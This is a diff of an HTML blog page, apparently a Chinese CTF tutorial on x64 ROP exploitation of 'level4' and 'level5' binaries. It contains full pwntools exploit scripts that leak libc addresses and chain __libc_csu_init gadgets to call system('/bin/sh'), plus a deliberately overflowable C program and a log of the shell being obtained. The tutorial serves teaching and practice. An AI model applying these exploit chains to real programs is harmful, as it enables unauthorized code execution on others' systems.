+pop_ret_offset <span class="token operator">=</span> <span class="token number">0x000000000002155f</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
 
-sh = process(&#39;./level4&#39;)
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level4'</span><span class="token punctuation">)</span>
 
-print &quot;##########get system########&quot;
-system_addr = int(sh.recvuntil(&#39;\n&#39;),16)
-print &quot;##########the system########&quot; + str(system_addr)
+<span class="token keyword">print</span> <span class="token string">"##########get system########"</span>
+system_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">"##########the system########"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
 
-binsh_addr = system_addr + binsh_offset
-print &quot;##########the binsh########&quot; + str(binsh_addr)
+binsh_addr <span class="token operator">=</span> system_addr <span class="token operator">+</span> binsh_offset
+<span class="token keyword">print</span> <span class="token string">"##########the binsh########"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
 
-pop_ret_addr = system_addr + pop_ret_offset
-print &quot;##########the pop rdi ret########&quot; +str(pop_ret_addr)
+pop_ret_addr <span class="token operator">=</span> system_addr <span class="token operator">+</span> pop_ret_offset
+<span class="token keyword">print</span> <span class="token string">"##########the pop rdi ret########"</span> <span class="token operator">+</span>str<span class="token punctuation">(</span>pop_ret_addr<span class="token punctuation">)</span>
 
-sh.recv()
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-#0x0000000000400585 : ret
-payload1 = &#39;A&#39;*136 + p64(0x0000000000400585) + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
+<span class="token comment" spellcheck="true">#0x0000000000400585 : ret</span>
+payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400585</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
 
-#0x000000000012188b : pop rax ; pop rdi ; call rax
-ppc_offset = 0x000000000012188b - libc.symbols[&#39;system&#39;]
-ppc_addr = ppc_offset + system_addr
-payload2 = &#39;A&#39;*136 +p64(ppc_addr) + p64(system_addr) + p64(binsh_addr)
+<span class="token comment" spellcheck="true">#0x000000000012188b : pop rax ; pop rdi ; call rax</span>
+ppc_offset <span class="token operator">=</span> <span class="token number">0x000000000012188b</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+ppc_addr <span class="token operator">=</span> ppc_offset <span class="token operator">+</span> system_addr
+payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>ppc_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
 
-sh.sendline(payload2)
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
 
-sh.interactive()</code></pre><p>注意到，我的payload有两个都可行。payload1 就是我们首先想到的思路，还放了一个p64(0x0000000000400585)，没错在执行system函数遇到了堆栈不平衡（日了狗了）<br>payload2 <strong>是想到了call指令来执行system函数（call 要放got地址）。pop rax 将system地址放入rax ，pop rdi将参数/bin/sh地址放入rdi，call rax：执行！（没有遇到堆栈步平衡问题，感觉以后可以多用call）</strong></p>
-<h3 id="本地测试结果"><a href="#本地测试结果" class="headerlink" title="本地测试结果"></a>本地测试结果</h3><pre><code>[DEBUG] Received 0x1c bytes:
-    &#39;0x7ffff782f440\n&#39;
-    &#39;Hello, World\n&#39;
-##########the system########140737345942592
-##########the binsh########140737347403418
-##########the pop rdi ret########140737345754463
-[DEBUG] Sent 0xa1 bytes:
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>注意到，我的payload有两个都可行。payload1 就是我们首先想到的思路，还放了一个p64(0x0000000000400585)，没错在执行system函数遇到了堆栈不平衡（日了狗了）<br>payload2 <strong>是想到了call指令来执行system函数（call 要放got地址）。pop rax 将system地址放入rax ，pop rdi将参数/bin/sh地址放入rdi，call rax：执行！（没有遇到堆栈步平衡问题，感觉以后可以多用call）</strong></p>
+<h3 id="本地测试结果"><a href="#本地测试结果" class="headerlink" title="本地测试结果"></a>本地测试结果</h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x1c bytes:
+    <span class="token string">'0x7ffff782f440\n'</span>
+    <span class="token string">'Hello, World\n'</span>
+<span class="token comment" spellcheck="true">##########the system########140737345942592</span>
+<span class="token comment" spellcheck="true">##########the binsh########140737347403418</span>
+<span class="token comment" spellcheck="true">##########the pop rdi ret########140737345754463</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0xa1 bytes:
     00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
     *
     00000080  41 41 41 41  41 41 41 41  8b 18 90 f7  ff 7f 00 00  │AAAA│AAAA│····│····│
-    00000090  40 f4 82 f7  ff 7f 00 00  9a 3e 99 f7  ff 7f 00 00  │@···│····│·&gt;··│····│
+    00000090  40 f4 82 f7  ff 7f 00 00  9a 3e 99 f7  ff 7f 00 00  │@···│····│·<span class="token operator">></span>··│····│
     000000a0  0a                                                  │·│
     000000a1
-[*] Switching to interactive mode
-$ whoami
-[DEBUG] Sent 0x7 bytes:
-    &#39;whoami\n&#39;
-[DEBUG] Received 0x7 bytes:
-    &#39;hunter\n&#39;
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+$ <span class="token function">whoami</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x7 bytes:
+    <span class="token string">'whoami\n'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x7 bytes:
+    <span class="token string">'hunter\n'</span>
 hunter
-$  </code></pre><h2 id="4：level5–通用gadgets"><a href="#4：level5–通用gadgets" class="headerlink" title="4：level5–通用gadgets"></a>4：level5–通用gadgets</h2><p><strong>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</strong></p>
+$  </code></pre>
+<h2 id="4：level5–通用gadgets"><a href="#4：level5–通用gadgets" class="headerlink" title="4：level5–通用gadgets"></a>4：level5–通用gadgets</h2><p><strong>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</strong></p>
 <p>level3和level4的程序都留了一些辅助函数在程序中，这次我们将这些辅助函数去掉再来挑战一下。目标程序level5.c如下：</p>
-<h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><pre><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
+<h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
 
-void vulnerable_function() {
-    char buf[128];
-    read(STDIN_FILENO, buf, 512);
-}
+<span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
-int main(int argc, char** argv) {
-    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
-    vulnerable_function();
-}</code></pre><p>没错你只有read和write函数和蒸米X86的level3 是一样的</p>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>没错你只有read和write函数和蒸米X86的level3 是一样的</p>
 <h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。<br>因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。<br>我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？<strong>其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d -Mintel level5观察一下__libc_csu_init()这个函数。</strong><br><strong>一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</strong></p>
-<pre><code>00000000004005a0 &lt;__libc_csu_init&gt;:
-  4005a0:    48 89 6c 24 d8           mov    QWORD PTR [rsp-0x28],rbp
-  4005a5:    4c 89 64 24 e0           mov    QWORD PTR [rsp-0x20],r12
-  4005aa:    48 8d 2d 73 08 20 00     lea    rbp,[rip+0x200873]        # 600e24 &lt;__init_array_end&gt;
-  4005b1:    4c 8d 25 6c 08 20 00     lea    r12,[rip+0x20086c]        # 600e24 &lt;__init_array_end&gt;
-  4005b8:    4c 89 6c 24 e8           mov    QWORD PTR [rsp-0x18],r13
-  4005bd:    4c 89 74 24 f0           mov    QWORD PTR [rsp-0x10],r14
-  4005c2:    4c 89 7c 24 f8           mov    QWORD PTR [rsp-0x8],r15
-  4005c7:    48 89 5c 24 d0           mov    QWORD PTR [rsp-0x30],rbx
+<pre class=" language-bash"><code class="language-bash">00000000004005a0 <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:
+  4005a0:    48 89 6c 24 d8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x28<span class="token punctuation">]</span>,rbp
+  4005a5:    4c 89 64 24 e0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x20<span class="token punctuation">]</span>,r12
+  4005aa:    48 8d 2d 73 08 20 00     lea    rbp,<span class="token punctuation">[</span>rip+0x200873<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 600e24 &lt;__init_array_end></span>
+  4005b1:    4c 8d 25 6c 08 20 00     lea    r12,<span class="token punctuation">[</span>rip+0x20086c<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 600e24 &lt;__init_array_end></span>
+  4005b8:    4c 89 6c 24 e8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x18<span class="token punctuation">]</span>,r13
+  4005bd:    4c 89 74 24 f0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x10<span class="token punctuation">]</span>,r14
+  4005c2:    4c 89 7c 24 f8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x8<span class="token punctuation">]</span>,r15
+  4005c7:    48 89 5c 24 d0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x30<span class="token punctuation">]</span>,rbx
   4005cc:    48 83 ec 38              sub    rsp,0x38
   4005d0:    4c 29 e5                 sub    rbp,r12
   4005d3:    41 89 fd                 mov    r13d,edi
   4005d6:    49 89 f6                 mov    r14,rsi
   4005d9:    48 c1 fd 03              sar    rbp,0x3
   4005dd:    49 89 d7                 mov    r15,rdx
-  4005e0:    e8 1b fe ff ff           call   400400 &lt;_init&gt;
-  4005e5:    48 85 ed                 test   rbp,rbp
-  4005e8:    74 1c                    je     400606 &lt;__libc_csu_init+0x66&gt;
+  4005e0:    e8 1b fe ff ff           call   400400 <span class="token operator">&lt;</span>_init<span class="token operator">></span>
+  4005e5:    48 85 ed                 <span class="token function">test</span>   rbp,rbp
+  4005e8:    74 1c                    je     400606 <span class="token operator">&lt;</span>__libc_csu_init+0x66<span class="token operator">></span>
   4005ea:    31 db                    xor    ebx,ebx
-  4005ec:    0f 1f 40 00              nop    DWORD PTR [rax+0x0]
-  4005f0:    4c 89 fa                 mov    rdx,r15              #关注点
+  4005ec:    0f 1f 40 00              nop    DWORD PTR <span class="token punctuation">[</span>rax+0x0<span class="token punctuation">]</span>
+  4005f0:    4c 89 fa                 mov    rdx,r15              <span class="token comment" spellcheck="true">#关注点</span>
   4005f3:    4c 89 f6                 mov    rsi,r14
   4005f6:    44 89 ef                 mov    edi,r13d
-  4005f9:    41 ff 14 dc              call   QWORD PTR [r12+rbx*8]
+  4005f9:    41 ff 14 <span class="token function">dc</span>              call   QWORD PTR <span class="token punctuation">[</span>r12+rbx*8<span class="token punctuation">]</span>
   4005fd:    48 83 c3 01              add    rbx,0x1
-  400601:    48 39 eb                 cmp    rbx,rbp
-  400604:    75 ea                    jne    4005f0 &lt;__libc_csu_init+0x50&gt;
-  400606:    48 8b 5c 24 08           mov    rbx,QWORD PTR [rsp+0x8]     #关注点从rsp+8开始读取栈中数据
-  40060b:    48 8b 6c 24 10           mov    rbp,QWORD PTR [rsp+0x10]
-  400610:    4c 8b 64 24 18           mov    r12,QWORD PTR [rsp+0x18]
-  400615:    4c 8b 6c 24 20           mov    r13,QWORD PTR [rsp+0x20]
-  40061a:    4c 8b 74 24 28           mov    r14,QWORD PTR [rsp+0x28]
-  40061f:    4c 8b 7c 24 30           mov    r15,QWORD PTR [rsp+0x30]
+  400601:    48 39 eb                 <span class="token function">cmp</span>    rbx,rbp
+  400604:    75 ea                    jne    4005f0 <span class="token operator">&lt;</span>__libc_csu_init+0x50<span class="token operator">></span>
+  400606:    48 8b 5c 24 08           mov    rbx,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>     <span class="token comment" spellcheck="true">#关注点从rsp+8开始读取栈中数据</span>
+  40060b:    48 8b 6c 24 10           mov    rbp,QWORD PTR <span class="token punctuation">[</span>rsp+0x10<span class="token punctuation">]</span>
+  400610:    4c 8b 64 24 18           mov    r12,QWORD PTR <span class="token punctuation">[</span>rsp+0x18<span class="token punctuation">]</span>
+  400615:    4c 8b 6c 24 20           mov    r13,QWORD PTR <span class="token punctuation">[</span>rsp+0x20<span class="token punctuation">]</span>
+  40061a:    4c 8b 74 24 28           mov    r14,QWORD PTR <span class="token punctuation">[</span>rsp+0x28<span class="token punctuation">]</span>
+  40061f:    4c 8b 7c 24 30           mov    r15,QWORD PTR <span class="token punctuation">[</span>rsp+0x30<span class="token punctuation">]</span>
   400624:    48 83 c4 38              add    rsp,0x38
   400628:    c3                       ret    
-  400629:    0f 1f 80 00 00 00 00     nop    DWORD PTR [rax+0x0]</code></pre><p>** 从4005f0开始：**<br>    1 r15=&gt;rdx,r14=&gt;rsi ,r13d=&gt;edi<br>    2 call指令我们可以利用，即将rbx弄成0，r12放目标函数got地址<br>    3 因为要执行上面rbx会变成0，add指令后rbx=1<br>    4 cmp    rbx,rbp如果相等就不会执行jne所以要把rbp设为1<br>    5 然后是6个mov将从rsp+8开始把栈中数据放入，rbx，rbp，r12，r13，r14，r15<br>    6 rsp往高地址移动0x38（56）字节即移动7次<br>    7 ret用来控制跳转到4005f0目的是执行r12中的函数<br><strong>所以先用栈溢出将程序跳到400606读取我们构造的payload最后ret到4005f0来执行r12中的函数，因为程序会继续往下走再次ret我们可以控制跳转到main函数，准备下一次攻击。</strong></p>
+  400629:    0f 1f 80 00 00 00 00     nop    DWORD PTR <span class="token punctuation">[</span>rax+0x0<span class="token punctuation">]</span></code></pre>
+<p>** 从4005f0开始：**<br>    1 r15=&gt;rdx,r14=&gt;rsi ,r13d=&gt;edi<br>    2 call指令我们可以利用，即将rbx弄成0，r12放目标函数got地址<br>    3 因为要执行上面rbx会变成0，add指令后rbx=1<br>    4 cmp    rbx,rbp如果相等就不会执行jne所以要把rbp设为1<br>    5 然后是6个mov将从rsp+8开始把栈中数据放入，rbx，rbp，r12，r13，r14，r15<br>    6 rsp往高地址移动0x38（56）字节即移动7次<br>    7 ret用来控制跳转到4005f0目的是执行r12中的函数<br><strong>所以先用栈溢出将程序跳到400606读取我们构造的payload最后ret到4005f0来执行r12中的函数，因为程序会继续往下走再次ret我们可以控制跳转到main函数，准备下一次攻击。</strong></p>
 <h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p>我们先构造payload1，利用write()输出write在内存中的地址。</p>
-<pre><code>#rdx=r15,rsi=r14,rdi=edi=r13d,r12=write_got,rbx=0,rbp=1 ret=0x4005f0  ##注释在这种长exp显得尤为重要
-#write(rdi=1,rsi=write_got,rdx=8)
-payload1 =  &quot;\x00&quot;*136   #NULL
-payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # 
-payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
-payload1 += &quot;\x00&quot;*56
-payload1 += p64(main)</code></pre><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。bss可用readelf -S level5获取</p>
-<pre><code>#rdx=r15,rsi=r14,rdi=edi=r13d,r12=read_got,rbx=0,rbp=1 ret=0x4005f0
-#read(rdi=0,rsi=bss_addr,rdx=16)  16字节是读取system的地址还有字符串/bin/sh\x00
-payload2 =  &quot;\x00&quot;*136
-payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) 
-payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
-payload2 += &quot;\x00&quot;*56
-payload2 += p64(main)</code></pre><h3 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h3><p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh\x00”保存在了.bss段首地址+8字节上。</p>
-<pre><code>#rdx=r15,rsi=r14,rdi=edi=r13d,r12=bss_addr,rbx=0,rbp=1 ret=0x4005f0
-#system(rdi=bss_addr + 8) rsi=0 rdx=0
-payload3 =  &quot;\x00&quot;*136
-payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) 
-payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
-payload3 += &quot;\x00&quot;*56
-payload3 += p64(main)</code></pre><h3 id="EXP（蒸米）"><a href="#EXP（蒸米）" class="headerlink" title="EXP（蒸米）"></a>EXP（蒸米）</h3><p>我本地测试遇到太多玄学问题了（很操蛋）</p>
-<pre><code>from pwn import *
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=write_got,rbx=0,rbp=1 ret=0x4005f0  ##注释在这种长exp显得尤为重要</span>
+<span class="token comment" spellcheck="true">#write(rdi=1,rsi=write_got,rdx=8)</span>
+payload1 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>   <span class="token comment" spellcheck="true">#NULL</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># </span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>
+payload1 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre>
+<h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。bss可用readelf -S level5获取</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=read_got,rbx=0,rbp=1 ret=0x4005f0</span>
+<span class="token comment" spellcheck="true">#read(rdi=0,rsi=bss_addr,rdx=16)  16字节是读取system的地址还有字符串/bin/sh\x00</span>
+payload2 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> 
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>
+payload2 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre>
+<h3 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h3><p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh\x00”保存在了.bss段首地址+8字节上。</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=bss_addr,rbx=0,rbp=1 ret=0x4005f0</span>
+<span class="token comment" spellcheck="true">#system(rdi=bss_addr + 8) rsi=0 rdx=0</span>
+payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>
+payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
+payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>
+payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>
+payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre>
+<h3 id="EXP（蒸米）"><a href="#EXP（蒸米）" class="headerlink" title="EXP（蒸米）"></a>EXP（蒸米）</h3><p>我本地测试遇到太多玄学问题了（很操蛋）</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-elf = ELF(&#39;level5&#39;)
-libc = ELF(&#39;libc.so.6&#39;)
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'level5'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>
 
-p = process(&#39;./level5&#39;)
-#p = remote(&#39;127.0.0.1&#39;,10001)
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p = remote('127.0.0.1',10001)</span>
 
-got_write = elf.got[&#39;write&#39;]
-print &quot;got_write: &quot; + hex(got_write)
-got_read = elf.got[&#39;read&#39;]
-print &quot;got_read: &quot; + hex(got_read)
+got_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> <span class="token string">"got_write: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span>
+got_read <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> <span class="token string">"got_read: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span>
 
-main = 0x400564
+main <span class="token operator">=</span> <span class="token number">0x400564</span>
 
-off_system_addr = libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;]
-print &quot;off_system_addr: &quot; + hex(off_system_addr)
+off_system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> <span class="token string">"off_system_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>off_system_addr<span class="token punctuation">)</span>
 
-#rdi=  edi = r13,  rsi = r14, rdx = r15 
-#write(rdi=1, rsi=write.got, rdx=4)
-payload1 =  &quot;\x00&quot;*136
-payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
-payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
-payload1 += &quot;\x00&quot;*56
-payload1 += p64(main)
+<span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span>
+<span class="token comment" spellcheck="true">#write(rdi=1, rsi=write.got, rdx=4)</span>
+payload1 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>
